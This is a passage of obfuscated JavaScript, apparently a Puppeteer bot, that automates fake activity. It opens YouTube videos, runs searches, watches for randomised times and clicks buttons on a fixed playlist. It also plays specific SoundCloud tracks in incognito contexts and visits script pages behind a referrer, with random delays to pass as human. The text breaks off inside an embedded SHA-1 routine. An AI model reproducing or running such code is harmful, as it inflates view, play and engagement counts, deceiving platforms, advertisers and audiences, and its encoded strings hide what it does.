const a2 = d,
  a1 = c,
  a0 = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x71f * 0x1 + -0x75f + 0x41))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x83 * -0x8 + -0x1 * 0x1e79 + 0x1a61), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x5ad4 * 0x1 + -0x3 * 0x4117 + -0x17b9 * -0x11 + (0x13d * -0x3b + 0x2 * 0x122b + 0x5f51 * 0x1) * random()) : await standardWaitForNetIdle(f), await wait(-0xd0 * -0x2 + 0x64d * -0x3 + 0x24cf + (-0x3cf0 + -0xddd + 0x71dd) * random()), -0x2002 + -0x536 * 0x4 + 0x34db;
}

function a() {
  const bq = [
    'omputed\x20>\x20',
    'ike\x20Gecko)',
    'W4dcJH3dLJufhuuhhG',
    'y2XPy2S',
    'Ahr0Chm6lY9Tzq',
    'bSoUp1RcG8kEWR55WPj8',
    'necraft\x20mo',
    'BmovW7ZcUwVcGhdcGIr/',
    'array',
    'Android\x2010',
    '.36',
    'ChrZl2j5lxnPDa',
    'W7j9W7ddUSkbgtK6g8oM',
    'Amo1W7VdVvdcMGhdRvbP',
    'kuzcnchdTmkbWODeWPG',
    'WRJdGmoOW5VcMSoGWRyVnSkz',
    '2h4g7euqR-',
    'C2G7ieLUDgvSia',
    'x2TLEt0',
    'dfU48FRgs0',
    'Ahr0Chm6lY9NCG',
    'Ag91C2uSBxiGyG',
    'rg/scripts',
    'W70srw3dLW1dW7fFfa',
    'replace',
    'easyfork.o',
    'WO11mG',
    '-and-map-i',
    'length',
    'pqpcHdezWRdcPbFdS8oL',
    'y2HHDgDWDc1VBG',
    'zxnnB2rL',
    'C3bSAxq'
  ];
  a = function() {
    return bq;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0xf2f + -0x11 * -0x17 + 0x2130), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1b43 + 0x1d35 + -0x47 * 0x7;
}
async function randomWait() {
  return await wait(-0x10cb * -0x1 + 0x2132 + 0x71 * -0x45 + (-0x98f + 0x21e + 0x1 * 0x1af9) * random()), -0x19d1 + -0x2132 + -0x6 * -0x9d6;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1dba + 0x1960 + 0x1 * 0x45a, 0x11f1 + -0x6 * 0x465 + 0x874), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x23 * -0xb87 + -0x1189a + 0x3966f) * getRandomInt(-0x1 * 0x2534 + 0x12 * -0x206 + -0x2 * -0x24d1, 0x359 * 0xa + 0x53 * -0x17 + -0x1a00), h)), 0x92f * -0x1 + -0x5f4 * 0x2 + 0x438 * 0x5;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * 0x2089 + 0x20e8 + -0x5 * 0x13);
    let h = e[f];
    if (b['mwMCWq'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0xf * -0x1cf + -0x2027 + 0x506, s, t, u = -0x13f6 + 0x1 * -0x1718 + -0x6 * -0x72d; t = n['charAt'](u++); ~t && (s = r % (0xf73 + 0x2084 + -0x997 * 0x5) ? s * (-0x1 * -0x1e8f + -0x1525 + -0x92a) + t : t, r++ % (-0x208c + -0x3 * -0xcc9 + -0x5cb * 0x1)) ? p += String['fromCharCode'](0x91 * -0x2b + 0x7 * 0x1bb + 0xd3d * 0x1 & s >> (-(-0xd0 * -0x2 + 0x64d * -0x3 + 0x1149) * r & -0x1e78 + -0x6ef + 0x256d)) : -0x2002 + -0x536 * 0x4 + 0x34da) {
          t = o['indexOf'](t);
        }
        for (let v = -0xf2f + -0x11 * -0x17 + 0xda8, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1b43 + 0x1d35 + -0xf1 * 0x2))['slice'](-(-0x10cb * -0x1 + 0x2132 + 0x355 * -0xf));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x98f + 0x21e + 0x1 * 0x771,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x19d1 + -0x2132 + -0x1 * -0x3b03; u < -0x1dba + 0x1960 + 0x2 * 0x2ad; u++) {
          p[u] = u;
        }
        for (u = 0x11f1 + -0x6 * 0x465 + 0x86d; u < 0x13 * -0x1c5 + -0x1762 + 0x3a01; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1 * 0x2534 + 0x12 * -0x206 + -0x2 * -0x2550), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x359 * 0xa + 0x53 * -0x17 + -0x1a05, q = 0x92f * -0x1 + -0x5f4 * 0x2 + 0x1517 * 0x1;
        for (let v = 0x10c7 + 0x1e6f + -0x1 * 0x2f36; v < n['length']; v++) {
          u = (u + (0x1 * 0x9ad + 0x1 * -0x1b15 + 0x1169 * 0x1)) % (-0x1 * 0x1c6a + 0x782 * 0x3 + 0x6e4), q = (q + p[u]) % (0x1 * -0xe9e + 0x1b * -0x12f + 0x2f93), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0xfe8 * 0x1 + 0x1 * 0x19a1 + -0x8b9)]);
        }
        return t;
      };
      b['dcbHXu'] = m, c = arguments, b['mwMCWq'] = !![];
    }
    const j = e[-0x2a * 0x5e + -0x1 * 0x18c9 + -0x1 * -0x2835],
      k = f + j,
      l = c[k];
    return !l ? (b['sPwEuK'] === undefined && (b['sPwEuK'] = !![]), h = b['dcbHXu'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0x10c7 + 0x1e6f + -0x1 * 0x2f36;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * 0x9ad + 0x1 * -0x1b15 + 0x1169 * 0x1]['split']('\x20');
    for (let k = -0x1 * 0x1c6a + 0x782 * 0x3 + 0x5e4; k < i['length']; k += 0x1 * -0xe9e + 0x1b * -0x12f + 0x2e95)
      j += i[k] * h[i[k + (-0xfe8 * 0x1 + 0x1 * 0x19a1 + -0x9b8)]];
    return j;
  });
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * 0x2089 + 0x20e8 + -0x5 * 0x13);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x2a * 0x5e + -0x1 * 0x18c9 + -0x1 * -0x283b)['map'](l => Array['from'](l['children']))['flat'](-0x7 * 0x3e7 + 0x1e00 + -0x2ae)['map'](l => l['childNodes'][-0x20a0 + 0x16fd + 0x269 * 0x4]['childNodes'][0x2143 + 0xd * 0xe2 + -0x2cbd * 0x1]['childNodes'][0x7 * -0xa7 + 0x2435 + -0x1fa3]['childNodes'][0xd2d + 0x15aa + -0x22d7]['childNodes'][0x1a07 + -0x1a67 + 0x61 * 0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xaf0 * 0x1 + -0x2461 + -0x1 * -0x1d59, 0x8c8 + 0x7fd + 0x2c3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x1 * -0x27ff + 0x2ef0 + 0x33a7);
  const h = await getMaxTime(f),
    i = Math['min']((0x552c + 0x2 * -0xe84b + 0x265ca) * getRandomInt(0x11f8 + 0x37f + -0x727 * 0x3, 0x143e + 0x92 + -0x14cb), h);
  return await wait(i), -0x11ba + -0x20 * -0xc7 + -0x3b * 0x1f;
}
async function frontScreenActions(f) {
  const R = c;
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x19cb + 0x17b0 + -0x317b]['children'][-0xb6c + 0x171f + 0x5 * -0x257]['children'][-0x1221 + -0xd * -0x1c1 + -0x5c * 0xd]['children'][0x1 * -0x49e + -0x88d * -0x3 + 0x3 * -0x703]['children'][0x7bf * -0x2 + 0x1e54 + -0x1a6 * 0x9]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f[R(0x3)]('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x3 * -0x918 + -0xbce + 0x2717;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x1 * 0x2089 + 0x20e8 + -0x5 * 0x13);
    let h = e[f];
    if (c['BCxcjZ'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0xf * -0x1cf + -0x2027 + 0x506, r, s, t = -0x13f6 + 0x1 * -0x1718 + -0x6 * -0x72d; s = m['charAt'](t++); ~s && (r = q % (0xf73 + 0x2084 + -0x997 * 0x5) ? r * (-0x1 * -0x1e8f + -0x1525 + -0x92a) + s : s, q++ % (-0x208c + -0x3 * -0xcc9 + -0x5cb * 0x1)) ? o += String['fromCharCode'](0x91 * -0x2b + 0x7 * 0x1bb + 0xd3d * 0x1 & r >> (-(-0xd0 * -0x2 + 0x64d * -0x3 + 0x1149) * q & -0x1e78 + -0x6ef + 0x256d)) : -0x2002 + -0x536 * 0x4 + 0x34da) {
          s = n['indexOf'](s);
        }
        for (let u = -0xf2f + -0x11 * -0x17 + 0xda8, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1b43 + 0x1d35 + -0xf1 * 0x2))['slice'](-(-0x10cb * -0x1 + 0x2132 + 0x355 * -0xf));
        }
        return decodeURIComponent(p);
      };
      c['cAeHiu'] = i, b = arguments, c['BCxcjZ'] = !![];
    }
    const j = e[-0x98f + 0x21e + 0x1 * 0x771],
      k = f + j,
      l = b[k];
    return !l ? (h = c['cAeHiu'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0xb73 * 0x3 + 0x19c3 + -0x18 * 0x27d + (0x113c + 0x899 * 0x1 + 0x1 * -0x19a3) * random()
  }), await wait(-0x1051 * 0x2 + -0xd03 * 0x2 + 0x4 * 0xf27 + (-0x1 * -0x745 + 0x2 * -0x102b + 0x1a3d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x73c * 0x2 + 0x25f * 0x2 + -0x1c * -0x59]['childNodes'][-0x2 * 0x16e + -0x21e3 * 0x1 + 0xa8 * 0x38]['childNodes'][0xced * -0x3 + -0x94b * -0x2 + -0x205 * -0xa]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1e8c + -0xd20 + 0x2bb1]['childNodes'][0x1 * 0x2591 + 0x11cd + 0x26 * -0x175]['childNodes'][0x18f8 + -0x1138 + 0x3df * -0x2]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        const S = c;
        let q = p['split'](',\x20')['map'](u => u[S(0x20)]('\x20'))['flat'](0x9a + 0x1752 * 0x1 + -0x7f9 * 0x3),
          r = -0x220d + -0x4f * -0x6d + -0x6a * -0x1;
        for (let u = -0x111 + 0x22ad * 0x1 + -0x219c; u < q['length']; u += 0x154c + -0x121f + 0x1 * -0x32b)
          r += q[u] * k[q[u + (-0xfa * -0x12 + 0x1 * 0x1e95 + -0x3028)]];
        return r;
      }(n);
  });
  await wait((0x1286 * -0x5 + 0x1 * 0x372d + 0x667 * 0xf) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1c8 * 0xe0 + -0x1 * -0x9265 + -0x13705) * getRandomInt(0x119a + 0x10e7 + -0x2280, -0x221d + -0x2332 + 0x4559), h + (0x1df * 0x1 + 0x7ff + -0x1 * -0x9aa));
  return await wait(i), -0x2f5 * 0x6 + -0x2 * 0x91d + 0x23f9 * 0x1;
}
async function keyWatch(f) {
  const U = d,
    T = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x13bc + -0x231f + 0xf63 * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + T(0xd, '03C4') + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + U(0x0) + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2 * 0x21e + 0x1d90 + -0x1614 + (-0x16c8 + 0x1 * -0xd69 + 0x1 * 0x2819) * Math['random']());
    });
  }, -0x41 * -0x40 + 0x1297 * -0x1 + -0x1bf * -0x11);
  await wait(-0x1 * 0x22997 + -0x2c4 * 0x34b + 0xfd8e3);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xac7 * 0x1 + -0x8 * -0x3173 + -0x3 * 0x3955) * getRandomInt(-0x1b * -0x5 + -0x1 * 0x10bd + 0x1 * 0x103a, -0xa15 + -0x12 * 0x181 + 0x95 * 0x40)), clearInterval(h), 0x1b40 + -0x1 * 0x1981 + -0xdf * 0x2;
}
async function runYTModule(f, h) {
  const V = b,
    i = await createPage(f, V(0xe, '2^h@') + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xbd8 * 0x3 + 0x221a + -0x45a2;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x4 * 0x970 + 0x20f2 + 0x1 * -0x46b1;
    await randomWait();
  }
  return -0x49 * -0x35 + -0x2192 * 0x1 + 0x1276;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1a16 + 0x739 + -0x214f + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x1d78 + -0x7fe + 0x2576 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x231f + 0x1f1 * -0xb + -0xdc4 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x11 * 0x67 + -0x29 * 0x92 + 0x108b;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0x3 * 0x577d + 0x3df * 0x1 + 0x1b260 + getRandomInt(-0x4084 + 0x2 * 0x9f5 + -0x165 * -0x4a, -0xe114 + 0x2571 * 0x5 + 0x5 * 0x1f03));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2 * 0xd9d + -0x4d * -0x53 + 0x244), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x80d + -0x25 * -0x1d + 0x3dc;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1693 * 0x1 + -0x10cd * 0x1 + 0x1 * -0x5c6, 0x13 * -0x17e + 0x1 * -0x1d7b + 0x5 * 0xb9b)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x14 * 0x1c4 + 0x1b8f + -0x370f + floor((0xd5b + -0x1 * -0x7a + -0x9ed * 0x1) * random()))), log('p2'), log(await s['evaluate'](() => {
        const X = d,
          W = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x3ab477cc + 0x19e462 * -0x190 + 0xe32950ec),
          -0xe150f2 + -0x22d * -0x59a7 + 0x9e4097,
          0x9632 + 0x5839 * 0x1 + -0x4cd * 0x17,
          -0x3 * 0x50b + 0x6 * -0x16c + -0x4d5 * -0x5
        ], y = [
          0x3 * -0x81 + 0x18d7 + -0x5cf * 0x4,
          -0x1bf7 * -0x1 + -0x49f * -0x1 + -0x2086,
          0x91f * -0x1 + 0x18f7 + -0xfd0,
          0xcae + -0x1 * -0x17 + -0x1 * 0xcc5
        ], z = [
          W(0x1a, 'aZEJ'),
          X(0x8),
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1a85 * 0x1 + -0x208a + 0x606)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x16bf + 0x2528 + -0xe69; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const Y = d;
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1 * 0xb47 + -0xa8f * -0x1 + -0x1 * 0x15d6) === N[Y(0x1c)])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x1f83 + -0x2235 + 0x41b8] = A[-0xa76 * 0x1 + -0x131 * 0xd + 0x1 * 0x1a03] = A[-0xe7c * -0x1 + 0x2196 + -0x3011] = A[0x15 * 0x1b + -0x1 * -0x261a + 0x1 * -0x284f] = A[0x12df + -0x2e * -0xa6 + -0x30b0] = A[0x1 * 0x20e7 + -0x1d0 * 0xb + 0x55 * -0x27] = A[0x2161 * -0x1 + 0x7 * -0xe7 + 0x27b7] = A[0x2fe * 0x5 + 0x1fcc + -0xf94 * 0x3] = A[-0x19e7 + -0x268e + -0x1 * -0x407c] = A[0x21cb * 0x1 + -0x1ed7 + -0x2ec] = A[0x1 * 0x1283 + 0xe17 + 0x3 * -0xadb] = A[0x482 * -0x3 + 0x47 * 0x26 + 0x306] = A[-0x14fe + 0x433 + 0x10d6] = A[0x1db + -0x19f1 * 0x1 + -0xc11 * -0x2] = A[0x1a1 * 0xf + 0xcc1 + -0x2523] = A[-0x2 * 0x110e + 0x1 * -0x1f7 + 0x3 * 0xc0b] = A[0x1 * 0x9a6 + -0x2254 + -0x3 * -0x83f] = 0x1730 + -0x140c + 0x1 * -0x324, this['blocks'] = A) : this['blocks'] = [
                0xaae * 0x1 + -0x2236 + 0x1788,
                -0x128b + 0x1ed4 + -0x11 * 0xb9,
                0x4d9 + -0x21a7 * -0x1 + -0x2680,
                0x1 * -0x1693 + -0xb58 + 0x13 * 0x1c9,
                0x5f4 * 0x6 + -0x2498 + -0x1c * -0x8,
                0x1e93 + 0x1 * 0x5b + -0x1eee,
                -0x2153 + 0x1 * 0x16dd + -0xce * -0xd,
                0x1e48 + 0x48 * -0x26 + -0x108 * 0x13,
                0x11e * 0xd + -0xfe8 + 0x162,
                -0xe5d * -0x1 + -0xa10 + 0x44d * -0x1,
                0xe5c + -0x1 * -0x221 + -0x107d,
                -0x137a + -0x744 + -0x6 * -0x475,
                0x2 * -0xf01 + 0x2e * 0xd3 + -0x7e8,
                0x1fc6 + 0x360 * 0x1 + -0x2326,
                -0x11e + 0x2 * 0xf0c + 0xe7d * -0x2,
                -0x24b1 + -0x1 * -0x166f + 0xe42,
                0x10d2 + 0x19db + -0x1db * 0x17
              ], this['h0'] = 0x75941f * -0x61 + 0x3bee3a9 * -0x25 + 0x11e692a2d, this['h1'] = 0x79f494e4 + -0x25 * -0xaf7ab47 + 0x43 * -0x44c380a, this['h2'] = 0x23ef * -0x1bccd + -0x6fa51e09 + 0x146cf456a, this['h3'] = -0x1 * -0x1b9e8382 + 0x1ba0a63a + -0x20ed * 0x12f9e, this['h4'] = 0x10683c9 * 0x3 + -0x47b01549 * -0x3 + -0x1650e946, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0xa42 + -0x1bff * -0x1 + 0x13 * -0xef, this['finalized'] = this['hashed'] = 0x132 + 0xb86 + -0xcb8, this['first'] = 0x5b * -0x1b + -0x16d1 + 0xc1 * 0x2b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1381 * 0x1 + -0x10d2 + 0x2453, O = J['length'] || -0x263b * 0x1 + 0x2 * -0x1031 + 0x469d, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0xb75 + 0x1b3b + -0x26b0, P[0x1679 + 0x3 * 0x7 + 0x168e * -0x1] = this['block'], P[0x259c + -0x10b3 + -0x9 * 0x251] = P[0x77f * -0x1 + 0x58 * 0x70 + 0x3e * -0x80] = P[0xa04 * -0x1 + -0x1e23 + 0x2829] = P[0x1 * 0xb7 + -0x1fb4 + 0x1f00] = P[-0x52 * 0xd + -0x10a3 * 0x2 + 0x2574] = P[0x74 * 0x2 + -0xf63 + 0xe80] = P[-0x2057 * 0x1 + -0x1 * -0x1063 + -0xffa * -0x1] = P[-0x1 * -0x127b + -0x1 * 0xb5d + -0x717] = P[-0x1bf5 + -0x24f2 + 0x40ef] = P[-0x1187 + 0x1 * -0x853 + 0x19e3] = P[-0xed7 * -0x1 + 0x6d * 0x2 + -0xfa7] = P[0x2 * -0x913 + 0x1 * -0x1013 + -0x5b6 * -0x6] = P[0x2e * 0x92 + -0x188a + -0x1a6] = P[0x7 * 0x2fe + -0x131a * 0x2 + -0x15 * -0xd3] = P[-0x157 + -0x521 + 0x686] = P[0x12fd * 0x1 + 0x1 * -0xded + -0x501] = -0x1fd9 + -0x2 * -0x1252 + -0x4cb), K) {
                    for (N = this['start']; M < O && N < -0x1 * 0x57 + 0x101 * -0x1f + 0x1fb6; ++M)
                      P[N >> -0x3 * 0x544 + 0x1ce + 0xe00] |= J[M] << y[-0x1b4d + -0x1103 + 0x2c53 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x21ed + -0x4c1 * 0x2 + 0x2baf; ++M)
                      (L = J['charCodeAt'](M)) < 0x262 * -0x1 + -0xcfe + 0xfe0 ? P[N >> 0x9 * 0x15a + -0x1029 + -0x29 * -0x19] |= L << y[0x4b8 + 0xcdf + -0x1194 & N++] : L < -0x1 * -0xa5b + 0x1d6c + 0x1 * -0x1fc7 ? (P[N >> -0x2566 + -0x305 * 0x2 + -0x86 * -0x53] |= (0x1be6 * 0x1 + -0x7cb + -0x135b | L >> -0x1 * 0x194d + 0x1b25 + -0xe9 * 0x2) << y[-0x8de + 0x45d * -0x2 + 0x119b & N++], P[N >> 0x1dfb + 0x24 * -0xdd + 0x1 * 0x11b] |= (-0xb * 0x1ed + -0x1 * -0x1883 + 0x1 * -0x2d4 | -0x1fe0 + -0x191d + 0x393c & L) << y[0x2 * 0x854 + 0x17c2 + 0x2867 * -0x1 & N++]) : L < 0x26 * -0xb23 + -0x2216 + -0x5 * -0x86a8 || L >= 0xb39d + 0x1 * -0x950c + -0x869 * -0x17 ? (P[N >> -0x1a70 + 0x2a2 + 0x2fa * 0x8] |= (-0x3f1 * -0x5 + 0x3 * -0x42d + -0x64e | L >> 0x14eb + 0x16cf + -0x2bae) << y[-0xfc6 * 0x1 + 0x1041 + -0x78 & N++], P[N >> 0x1e3d * -0x1 + -0xb * 0x6b + -0x28 * -0xdf] |= (-0x1b73 + 0x13af * 0x1 + 0x211 * 0x4 | L >> 0x321 * 0x3 + 0x9 * 0x406 + 0x3 * -0xf31 & -0xba8 * 0x1 + 0x2 * 0x319 + -0x1 * -0x5b5) << y[-0x5e * 0x11 + 0xf29 + -0x8e8 & N++], P[N >> 0x19b2 + -0x271 + -0x173f] |= (0x2a * -0x90 + -0x2033 + 0x3853 | 